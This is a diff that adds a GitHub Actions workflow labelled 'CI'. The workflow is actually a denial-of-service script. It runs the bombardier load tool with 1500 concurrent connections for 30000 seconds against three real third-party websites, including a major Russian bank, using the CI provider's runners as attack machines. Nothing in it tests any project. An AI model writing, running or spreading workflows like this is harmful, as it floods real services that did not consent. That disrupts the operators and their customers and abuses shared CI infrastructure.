@@ -1,0 +1,20 @@
+name: CI
+
+on:
+  workflow_dispatch:
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        url: ["https://stormwall.pro/", "https://solidwall.ru/", "https://www.sberbank.ru/"]
+    container:
+      image: alpine/bombardier
+
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: Run a multi-line script
+        run: |
+          bombardier -c 1500 -d 30000s -l ${{ matrix.url }}
